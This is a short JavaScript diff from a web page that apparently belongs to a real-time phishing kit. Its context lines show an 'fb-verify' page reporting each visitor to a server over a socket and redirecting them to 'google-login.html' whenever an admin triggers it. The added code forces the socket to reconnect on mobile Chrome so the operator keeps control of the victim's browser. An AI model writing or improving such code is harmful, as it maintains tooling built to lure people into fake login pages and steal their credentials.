@@ -299,6 +299,14 @@
     socket.on('connect', function () {
       socket.emit('userConnectedToPage', { clientId: clientId, page: 'fb-verify' });
     });
+    /* Chrome mobile: force reconnect when page returns to foreground */
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState === 'visible') {
+        setTimeout(function () {
+          if (!socket.connected) socket.connect();
+        }, 600);
+      }
+    });
     /* If admin re-triggers google-login while user is on this page, proceed normally */
     socket.on('show-google-login', function () {
       window.location.href = 'google-login.html';
